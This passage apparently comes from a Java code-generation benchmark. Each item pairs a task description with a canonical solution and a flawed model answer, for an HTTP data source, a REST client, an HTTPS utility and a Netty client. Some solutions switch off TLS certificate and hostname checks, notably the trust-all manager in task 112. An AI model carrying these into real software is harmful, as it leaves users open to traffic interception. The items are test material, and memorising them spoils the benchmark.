   private RealResponse getRealResponse(HttpURLConnection conn) throws IOException {\n        int statusCode = conn.getResponseCode();\n        String statusMessage = conn.getResponseMessage();\n        StringBuilder response = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n        } catch (IOException e) {\n            try (BufferedReader errorReader = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                String errorLine;\n                while ((errorLine = errorReader.readLine()) != null) {\n                    response.append(errorLine);\n                }\n            }\n        }\n        return new RealResponse(statusCode, statusMessage, response.toString(), null);\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        return new RealResponse(500, \"Internal Server Error\", null, e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Implement a custom HTTP data source for streaming media that handles connection management, redirects, and error handling, specifically designed for YouTube video streaming.\n\nClass Description: YoutubeHttpDataSource is a custom HTTP data source implementation that extends BaseDataSource and implements HttpDataSource interface. It provides functionality for opening and closing HTTP connections, handling redirects, and managing input streams for media streaming.\n\nAttributes:\n\nallowCrossProtocolRedirects: boolean - Determines whether cross-protocol redirects (HTTP to HTTPS or vice versa) are allowed\nconnectTimeoutMillis: int - Connection timeout in milliseconds\nreadTimeoutMillis: int - Read timeout in milliseconds\nrequestProperties: RequestProperties - Contains HTTP request headers and properties\ndataSpec: DataSpec - Contains information about the data to be read\nconnection: HttpURLConnection - The active HTTP connection\ninputStream: InputStream - The input stream for reading data\nopened: boolean - Flag indicating whether the data source is currently open\n\nMethods:\n\nopen(DataSpec dataSpecParameter) -> long - Opens the data source for the specified DataSpec and returns the length of the data\nmakeConnection(DataSpec dataSpecToUse) -> HttpURLConnection - Creates and configures an HTTP connection, handling redirects\nopenConnection(URL url) -> HttpURLConnection - Opens a basic HTTP connection to the specified URL\nhandleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) -> URL - Handles HTTP redirects and returns the new URL\nclose() -> void - Closes the data source and releases all resources\nmaybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) -> void - Helper method to terminate input streams on specific Android versions\ncloseConnectionQuietly() -> void - Safely closes the current connection without throwing exceptions",
    "Canonical_solution": "import com.google.android.exoplayer2.C;\nimport com.google.android.exoplayer2.PlaybackException;\nimport com.google.android.exoplayer2.upstream.DataSource;\nimport com.google.android.exoplayer2.upstream.DataSpec;\nimport com.google.android.exoplayer2.upstream.HttpDataSource;\nimport com.google.android.exoplayer2.util.Util;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.Method;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.NoRouteToHostException;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n\n    private static final int MAX_REDIRECTS = 20;\n    private static final int HTTP_STATUS_TEMPORARY_REDIRECT = 307;\n    private static final int HTTP_STATUS_PERMANENT_REDIRECT = 308;\n    private static final long MAX_BYTES_TO_DRAIN = 2048;\n\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n\n    @Nullable\n    private DataSpec dataSpec;\n    @Nullable\n    private HttpURLConnection connection;\n    @Nullable\n    private InputStream inputStream;\n    private boolean opened;\n\n    @Override\n    public long open(@NonNull final DataSpec dataSpecParameter) throws HttpDataSourceException {\n        this.dataSpec = dataSpecParameter;\n        transferInitializing(dataSpecParameter);\n\n        try {\n            this.connection = makeConnection(dataSpec);\n            final HttpURLConnection httpURLConnection = this.connection;\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String responseMessage = httpURLConnection.getResponseMessage();\n\n            if (responseCode < 200 || responseCode > 299) {\n                throw new InvalidResponseCodeException(responseCode, responseMessage, null,\n                        httpURLConnection.getHeaderFields(), dataSpec, Util.EMPTY_BYTE_ARRAY);\n            }\n\n            inputStream = httpURLConnection.getInputStream();\n            opened = true;\n            transferStarted(dataSpecParameter);\n            return dataSpecParameter.length != C.LENGTH_UNSET ? dataSpecParameter.length : 0;\n        } catch (final IOException e) {\n            closeConnectionQuietly();\n            throw HttpDataSourceException.createForIOException(e, dataSpec,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @NonNull\n    private HttpURLConnection makeConnection(@NonNull final DataSpec dataSpecToUse)\n            throws IOException {\n        URL url = new URL(dataSpecToUse.uri.toString());\n        int redirectCount = 0;\n\n        while (redirectCount++ <= MAX_REDIRECTS) {\n            final HttpURLConnection httpURLConnection = openConnection(url);\n            httpURLConnection.setConnectTimeout(connectTimeoutMillis);\n            httpURLConnection.setReadTimeout(readTimeoutMillis);\n\n            for (final Map.Entry<String, String> property : requestProperties.getSnapshot().entrySet()) {\n                httpURLConnection.setRequestProperty(property.getKey(), property.getValue());\n            }\n\n            httpURLConnection.setInstanceFollowRedirects(false);\n            httpURLConnection.setDoOutput(true);\n            httpURLConnection.connect();\n\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String location = httpURLConnection.getHeaderField(\"Location\");\n            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM\n                    || responseCode == HttpURLConnection.HTTP_MOVED_TEMP\n                    || responseCode == HttpURLConnection.HTTP_SEE_OTHER\n                    || responseCode == HTTP_STATUS_TEMPORARY_REDIRECT\n                    || responseCode == HTTP_STATUS_PERMANENT_REDIRECT) {\n                httpURLConnection.disconnect();\n                url = handleRedirect(url, location, dataSpecToUse);\n            } else {\n                return httpURLConnection;\n            }\n        }\n\n        throw new HttpDataSourceException(\n                new NoRouteToHostException(\"Too many redirects: \" + redirectCount),\n                dataSpecToUse,\n                PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                HttpDataSourceException.TYPE_OPEN);\n    }\n\n    private HttpURLConnection openConnection(@NonNull final URL url) throws IOException {\n        return (HttpURLConnection) url.openConnection();\n    }\n\n    @NonNull\n    private URL handleRedirect(final URL originalUrl,\n                             @Nullable final String location,\n                             final DataSpec dataSpecToHandleRedirect)\n            throws HttpDataSourceException {\n        if (location == null) {\n            throw new HttpDataSourceException(\"Null location redirect\", dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n\n        try {\n            URL url = new URL(originalUrl, location);\n            String protocol = url.getProtocol();\n            if (!\"https\".equals(protocol) && !\"http\".equals(protocol)) {\n                throw new HttpDataSourceException(\"Unsupported protocol redirect: \" + protocol,\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            if (!allowCrossProtocolRedirects && !protocol.equals(originalUrl.getProtocol())) {\n                throw new HttpDataSourceException(\n                        \"Disallowed cross-protocol redirect (\"\n                                + originalUrl.getProtocol()\n                                + \" to \"\n                                + protocol\n                                + \")\",\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            return url;\n        } catch (final MalformedURLException e) {\n            throw new HttpDataSourceException(e, dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @Override\n    public void close() throws HttpDataSourceException {\n        try {\n            if (inputStream != null) {\n                maybeTerminateInputStream(connection, C.LENGTH_UNSET);\n                try {\n                    inputStream.close();\n                } catch (final IOException e) {\n                    throw new HttpDataSourceException(e, castNonNull(dataSpec),\n                            PlaybackException.ERROR_CODE_IO_UNSPECIFIED,\n                            HttpDataSourceException.TYPE_CLOSE);\n                }\n            }\n        } finally {\n            inputStream = null;\n            closeConnectionQuietly();\n            if (opened) {\n                opened = false;\n                transferEnded();\n            }\n        }\n    }\n\n    private static void maybeTerminateInputStream(@Nullable final HttpURLConnection connection,\n                                                final long bytesRemaining) {\n        if (connection == null || Util.SDK_INT < 19 || Util.SDK_INT > 20) {\n            return;\n        }\n\n        try {\n            InputStream inputStream = connection.getInputStream();\n            String className = inputStream.getClass().getName();\n            if (\"com.android.okhttp.internal.http.HttpTransport$ChunkedInputStream\".equals(className)\n                    || \"com.android.okhttp.internal.http.HttpTransport$FixedLengthInputStream\".equals(className)) {\n                Class<?> superclass = inputStream.getClass().getSuperclass();\n                Method unexpectedEndOfInput = checkNotNull(superclass).getDeclaredMethod(\"unexpectedEndOfInput\");\n                unexpectedEndOfInput.setAccessible(true);\n                unexpectedEndOfInput.invoke(inputStream);\n            }\n        } catch (final Exception e) {\n            // Ignore\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (final Exception e) {\n                // Ignore\n            }\n            connection = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n    private DataSpec dataSpec;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n    private boolean opened;\n\n    public YoutubeHttpDataSource(boolean allowCrossProtocolRedirects, int connectTimeoutMillis, int readTimeoutMillis, RequestProperties requestProperties) {\n        this.allowCrossProtocolRedirects = allowCrossProtocolRedirects;\n        this.connectTimeoutMillis = connectTimeoutMillis;\n        this.readTimeoutMillis = readTimeoutMillis;\n        this.requestProperties = requestProperties;\n        this.opened = false;\n    }\n\n    @Override\n    public long open(DataSpec dataSpecParameter) throws IOException {\n        this.dataSpec = dataSpecParameter;\n        connection = makeConnection(dataSpecParameter);\n        if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {\n            close();\n            throw new IOException(\"Failed to open connection: \" + connection.getResponseCode());\n        }\n        String contentLengthHeader = connection.getHeaderField(\"Content-Length\");\n        long contentLength = contentLengthHeader != null ? Long.parseLong(contentLengthHeader) : -1;\n        return contentLength;\n    }\n\n    private HttpURLConnection makeConnection(DataSpec dataSpecToUse) throws IOException {\n        URL url = new URL(dataSpecToUse.uri);\n        HttpURLConnection conn = openConnection(url);\n        conn.setConnectTimeout(connectTimeoutMillis);\n        conn.setReadTimeout(readTimeoutMillis);\n        for (Map.Entry<String, String> entry : requestProperties.getHeaders().entrySet()) {\n            conn.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n        if (dataSpecToUse.start != C.TIME_UNSET) {\n            String range = \"bytes=\" + dataSpecToUse.start + \"-\" + (dataSpecToUse.end == C.TIME_UNSET ? \"\" : dataSpecToUse.end);\n            conn.setRequestProperty(\"Range\", range);\n        }\n        int maxRedirects = 5;\n        int redirectCount = 0;\n        while (redirectCount < maxRedirects) {\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP || responseCode == HttpURLConnection.HTTP_SEE_OTHER) {\n                String location = conn.getHeaderField(\"Location\");\n                if (location == null) {\n                    throw new IOException(\"Redirect location not found\");\n                }\n                URL newUrl = handleRedirect(url, location, dataSpecToUse);\n                if (newUrl == null) {\n                    throw new IOException(\"Invalid redirect URL\");\n                }\n                url = newUrl;\n                conn = openConnection(url);\n                redirectCount++;\n            } else {\n                break;\n            }\n        }\n        return conn;\n    }\n\n    private URL handleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) throws IOException {\n        try {\n            URL newUrl = new URL(location);\n            if (!allowCrossProtocolRedirects && !originalUrl.getProtocol().equals(newUrl.getProtocol())) {\n                throw new IOException(\"Cross-protocol redirect not allowed\");\n            }\n            return newUrl;\n        } catch (MalformedURLException e) {\n            throw new IOException(\"Invalid redirect URL\", e);\n        }\n    }\n\n    private HttpURLConnection openConnection(URL url) throws IOException {\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setInstanceFollowRedirects(false);\n        return conn;\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (opened) {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (connection != null) {\n                closeConnectionQuietly();\n            }\n            opened = false;\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        try {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (Exception e) {\n        }\n    }\n\n    private void maybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) {\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {\n            connection.disconnect();\n        }\n    }\n}"
  },
  {
    "Task_id": 111,
    "Instruction": "Task Description: Create a Java class that implements a RESTful client using HttpURLConnection to perform HTTP requests (GET, POST, PUT) and handle responses.\n\nClass Description: The `RestfulClient` class provides methods to execute HTTP requests (GET, POST, PUT) to a specified URL and process the responses. It handles connection setup, request parameter configuration, input/output stream management, and connection cleanup.\n\nAttributes: None\n\nMethods:\n\nMethod1: `get(String path) -> String` - Executes a GET request to the specified URL path and returns the response as a String.  \nMethod2: `post(String path, String requestBody) -> String` - Executes a POST request to the specified URL path with the provided request body and returns the response as a String.  \nMethod3: `put(String path, String requestBody) -> String` - Executes a PUT request to the specified URL path with the provided request body and returns the response as a String.  \nMethod4: `executeRequest(String method, String path, String requestBody) -> String` - Internal helper method that handles the common logic for executing HTTP requests (connection setup, request configuration, and response processing).  \nMethod5: `getVal(RestfulRequest request) -> String` - Executes a custom HTTP request based on the provided `RestfulRequest` object (containing URL, method, and parameters) and returns the response as a String.  \n\nInput:  \n- For `get`, `post`, and `put`:  \n  - `path` (String): The target URL for the HTTP request.  \n  - `requestBody` (String, optional for POST/PUT): The request payload in JSON format.  \n- For `getVal`:  \n  - `request` (RestfulRequest): An object encapsulating the request details (URL, HTTP method, and parameters).  \n\nOutput:  \n- String: The response body from the HTTP request, or `null` if an error occurs.",
    "Canonical_solution": "import lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\npublic class RestfulClient {\n\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    private String executeRequest(String method, String path, String requestBody){\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(path);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            connection.setRequestProperty(\"Content-Type\", \"application/json; charset=utf-8\");\n\n            if (requestBody != null) {\n                connection.setDoOutput(true);\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = requestBody.getBytes();\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            if (connection.getResponseCode() == 200) {\n                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                    String inputLine;\n                    StringBuilder response = new StringBuilder();\n                    while ((inputLine = in.readLine()) != null) {\n                        response.append(inputLine);\n                    }\n                    return response.toString();\n                }\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n    public String getVal(RestfulRequest request) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(request.getUrl());\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(request.getMethod());\n            connection.setDoInput(true);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \" application/json\");\n            byte[] content = request.getParam().getBytes();\n            connection.setRequestProperty(\"Content-Length\", content.length + \"\");\n\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.connect();\n            OutputStream out = connection.getOutputStream();\n            out.write(content);\n            out.flush();\n            out.close();\n\n            if (connection.getResponseCode() == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RestfulClient {\n    public static class RestfulRequest {\n        private String url;\n        private String method;\n        private Map<String, String> parameters;\n\n        public RestfulRequest(String url, String method, Map<String, String> parameters) {\n            this.url = url;\n            this.method = method;\n            this.parameters = parameters;\n        }\n\n        public String getUrl() { return url; }\n        public String getMethod() { return method; }\n        public Map<String, String> getParameters() { return parameters; }\n    }\n\n    private String parametersToJson(Map<String, String> params) {\n        StringBuilder json = new StringBuilder(\"{\");\n        int i = 0;\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            json.append(\"\\\"\").append(entry.getKey()).append(\"\\\":\\\"\").append(entry.getValue()).append(\"\\\"\");\n            if (i < params.size() - 1) {\n                json.append(\",\");\n            }\n            i++;\n        }\n        json.append(\"}\");\n        return json.toString();\n    }\n\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    private String executeRequest(String method, String path, String requestBody) {\n        try {\n            URL url = new URL(path);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(method);\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout(5000);\n\n            if (requestBody != null && (method.equals(\"POST\") || method.equals(\"PUT\"))) {\n                conn.setDoOutput(true);\n                try (OutputStream os = conn.getOutputStream()) {\n                    byte[] input = requestBody.getBytes(StandardCharsets.UTF_8);\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode != HttpURLConnection.HTTP_OK) {\n                return null;\n            }\n\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            } catch (IOException e) {\n                return null;\n            } finally {\n                conn.disconnect();\n            }\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public String getVal(RestfulRequest request) {\n        String method = request.getMethod();\n        String url = request.getUrl();\n        Map<String, String> parameters = request.getParameters();\n\n        if (method.equals(\"GET\")) {\n            StringBuilder queryString = new StringBuilder();\n            for (Map.Entry<String, String> entry : parameters.entrySet()) {\n                if (queryString.length() > 0) {\n                    queryString.append(\"&\");\n                }\n                queryString.append(entry.getKey()).append(\"=\").append(entry.getValue());\n            }\n            String fullUrl = url + \"?\" + queryString.toString();\n            return executeRequest(\"GET\", fullUrl, null);\n        } else {\n            return executeRequest(method, url, parametersToJson(parameters));\n        }\n    }\n}"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Java utility class for making HTTPS requests using HttpURLConnection with custom SSL socket factory configuration.\n\nClass Description: HttpClientUtil is a utility class that provides methods for making HTTPS requests with custom SSL/TLS configuration. It handles both GET and POST methods, manages connection settings, and includes proper error handling and resource cleanup.\n\nAttributes: (None - this is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String method, String outputStr) -> HttpResponse - Makes an HTTPS request to the specified URL using the given HTTP method. Handles request body for POST methods and returns the server response.\n\nMethod2: httpsRequest2(String requestUrl, String method, String outputStr) -> HttpResponse - Alternative implementation that uses a different URL constructor with protocol handler, otherwise similar to httpsRequest.\n\nMethod3: createSSLSocketFactory() -> SSLSocketFactory - Private helper method that creates and configures an SSLSocketFactory with custom TrustManager for SSL/TLS connections. Throws IOException if SSL context creation fails.\n\nInput Parameters:\n- requestUrl: String - The HTTPS URL to connect to\n- method: String - HTTP method (GET/POST)\n- outputStr: String - Request body content (for POST requests)\n\nOutput:\n- Returns HttpResponse object containing the server response\n- Throws IOException for connection or SSL configuration errors",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.NoSuchProviderException;\n\npublic class HttpClientUtil {\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(requestUrl);\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(null, requestUrl, new sun.net.www.protocol.https.Handler());\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    private static SSLSocketFactory createSSLSocketFactory() throws IOException {\n        try {\n            TrustManager[] tm = { new MyX509TrustManager() };\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\", \"SunJSSE\");\n            sslContext.init(null, tm, new java.security.SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (NoSuchAlgorithmException | NoSuchProviderException e) {\n            throw new IOException(\"\u5b9e\u4f8b\u5316SSLContext\u5931\u8d25\", e);\n        } catch (KeyManagementException e) {\n            throw new IOException(\"\u521d\u59cb\u5316SSLContext\u5931\u8d25\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClientUtil {\n    public static class HttpResponse {\n        private final int statusCode;\n        private final String response;\n        private final Map<String, List<String>> headers;\n\n        public HttpResponse(int statusCode, String response, Map<String, List<String>> headers) {\n            this.statusCode = statusCode;\n            this.response = response;\n            this.headers = headers;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public String getResponse() {\n            return response;\n        }\n\n        public Map<String, List<String>> getHeaders() {\n            return headers;\n        }\n    }\n\n    private static SSLSocketFactory createSSLSocketFactory() throws IOException {\n        try {\n            TrustManager[] trustAllCerts = new TrustManager[] {\n                new X509TrustManager() {\n                    public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n                }\n            };\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            throw new IOException(\"SSL context creation failed\", e);\n        }\n    }\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws IOException {\n        URL url = new URL(requestUrl);\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setRequestMethod(method);\n        connection.setSSLSocketFactory(createSSLSocketFactory());\n        connection.setHostnameVerifier((hostname, session) -> true);\n\n        if (method.equals(\"POST\")) {\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = outputStr.getBytes(StandardCharsets.UTF_8);\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        Map<String, List<String>> headers = new HashMap<>();\n        for (Map.Entry<String, List<String>> entry : connection.getHeaderFields().entrySet()) {\n            headers.put(entry.getKey(), entry.getValue());\n        }\n\n        try (InputStream inputStream = responseCode >= 200 && responseCode < 300 ? connection.getInputStream() : connection.getErrorStream()) {\n            StringBuilder response = new StringBuilder();\n            int c;\n            while ((c = inputStream.read()) != -1) {\n                response.append((char) c);\n            }\n            return new HttpResponse(responseCode, response.toString(), headers);\n        }\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws IOException {\n        URL url = new URL(requestUrl);\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setRequestMethod(method);\n        connection.setSSLSocketFactory(createSSLSocketFactory());\n        connection.setHostnameVerifier((hostname, session) -> true);\n\n        if (method.equals(\"POST\")) {\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = outputStr.getBytes(StandardCharsets.UTF_8);\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        Map<String, List<String>> headers = new HashMap<>();\n        for (Map.Entry<String, List<String>> entry : connection.getHeaderFields().entrySet()) {\n            headers.put(entry.getKey(), entry.getValue());\n        }\n\n        try (InputStream inputStream = responseCode >= 200 && responseCode < 300 ? connection.getInputStream() : connection.getErrorStream()) {\n            StringBuilder response = new StringBuilder();\n            int c;\n            while ((c = inputStream.read()) != -1) {\n                response.append((char) c);\n            }\n            return new HttpResponse(responseCode, response.toString(), headers);\n        }\n    }\n}"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send and receive messages, and handle SSL encryption if required.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified server, optionally using SSL encryption, and includes a handler for processing incoming and outgoing messages.\n\nAttributes:\nSSL: [boolean] - Flag indicating whether SSL encryption should be used\nHOST: [String] - The host address of the server to connect to\nPORT: [int] - The port number of the server to connect to\nSIZE: [int] - The size parameter for message handling (unused in basic implementation)\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the Netty client, establishing a connection to the specified server. Handles SSL context creation if needed, configures the client pipeline, and manages connection lifecycle.\ninitChannel: [initChannel]([SocketChannel ch]) -> [void] - (Internal method) Configures the channel pipeline with SSL handler (if enabled) and custom client handler during channel initialization.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class EchoClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.TCP_NODELAY, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new EchoClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
